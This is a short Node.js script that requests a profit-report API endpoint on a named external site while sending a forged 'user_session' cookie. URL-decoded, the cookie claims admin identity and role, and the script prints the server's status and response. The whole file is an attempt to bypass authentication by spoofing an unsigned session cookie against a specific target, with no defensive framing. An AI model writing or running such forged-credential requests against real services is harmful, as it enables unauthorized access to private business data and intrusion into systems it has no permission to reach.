const https = require('https');

function test(url) {
  https.get(url, {
    headers: {
      'Cookie': 'user_session=%7B%22id%22%3A1%2C%22username%22%3A%22admin%22%2C%22role%22%3A%22ADMIN%22%7D'
    }
  }, (res) => {
    let data = '';
    res.on('data', c => data += c);
    res.on('end', () => console.log(url, 'Status:', res.statusCode, 'Data:', data.slice(0, 500)));
  }).on('error', console.error);
}

test('https://hemnerp.org/api/reports/profit?currencyId=all');
